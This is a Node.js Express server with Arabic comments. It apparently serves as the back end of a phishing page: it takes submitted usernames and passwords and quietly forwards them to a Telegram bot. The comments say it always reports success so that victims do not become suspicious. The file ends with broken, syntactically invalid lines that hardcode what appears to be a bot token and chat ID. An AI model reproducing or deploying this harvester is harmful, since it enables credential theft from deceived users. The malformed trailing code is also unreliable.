require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// نقطة استقبال البيانات وإرسالها لبوت تيليجرام بصمت
app.post('/api/send-data', async (req, res) => {
    const { username, password } = req.body;

    if (!username) {
        return res.status(400).json({ success: false });
    }

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    const message = `🚨 بيانات جديدة:\n👤 المستخدم: ${username}\n🔑 كلمة المرور: ${password || 'غير مسجلة'}`;

    try {
        const fetch = (await import('node-fetch')).default;
        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

        await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        });

        // دائماً نرد بنجاح ظاهرياً للمستخدم حتى لا يشك في شيء
        res.json({ success: true });
    } catch (error) {
        // حتى لو حدث خطأ تقني، نرد بنجاح وهمي لكي تستمر الصفحة بشكل طبيعي دون إزعاج المستخدم
        res.json({ success: true });
    }
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
  // ضع التوكن والـ Chat ID الخاص بك هنا
  const botToken ="8852999428:AAF0PeE9OjP24wXt6F13KfJamq1X58-luL4"; ";
  const chatId = ";7516606366";
